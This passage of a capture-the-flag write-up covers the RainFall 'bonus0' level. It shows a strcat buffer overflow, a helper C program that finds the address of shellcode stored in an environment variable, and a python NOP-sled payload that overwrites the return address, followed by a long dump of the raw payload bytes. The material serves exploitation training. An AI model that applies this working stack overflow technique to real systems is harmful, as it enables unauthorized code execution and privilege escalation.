...
```
_we can see main is calling pp() and puts._
_pp() is calling strcpy, strcat strlen and call p()_
_p() is calling puts, read, strchr and strncpy_ 
_we can user strcat to buffer overflow_

_after running with a pattern, we get a segfault at 0x41336141 -> offset is 9. Segfault is in 2nd string_
```
...
0x41336141 in ?? ()
```
_to exploit this, we will need the buffer of the first param (4095), we write \n and the adress to the [shell code](http://shell-storm.org/shellcode/files/shellcode-752.php) and fill the 2nd param_
...
bonus0@RainFall:~$ echo '#include <stdio.h>' >> /tmp/bonus0.c
bonus0@RainFall:~$ echo '#include <stdlib.h>' >> /tmp/bonus0.c
bonus0@RainFall:~$ echo 'int main(int argc, char **argv) {' >> /tmp/bonus0.c
bonus0@RainFall:~$ echo '    printf("%s is %p\n", argv[1], getenv(argv[1]));' >> /tmp/bonus0.c
bonus0@RainFall:~$ echo '}' >> /tmp/bonus0.c
bonus0@RainFall:~$ cd  /tmp
bonus0@RainFall:/tmp$ cc /tmp/bonus0.c 
bonus0@RainFall:/tmp$ ./a.out SHELLCODE
SHELLCODE is 0xbffff71d
```

_now we can create our payload_
  '\x90' * 4095
  '\n'
  '\x90' * 9
  '\x1d\xf7\xff\xbf'
...
python -c "print '\x90' * 4095  + '\n' + '\x90' * 9 + '\x1d\xf7\xff\xbf' + '\x90' * 30"

```
bonus0@RainFall:/tmp$ python -c "print '\x90' * 4095  + '\n' + '\x90' * 9 + '\x1d\xf7\xff\xbf' + '\x90' * 30" > bonus0
bonus0@RainFall:/tmp$ cat bonus0
���������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������
������������������������������������������
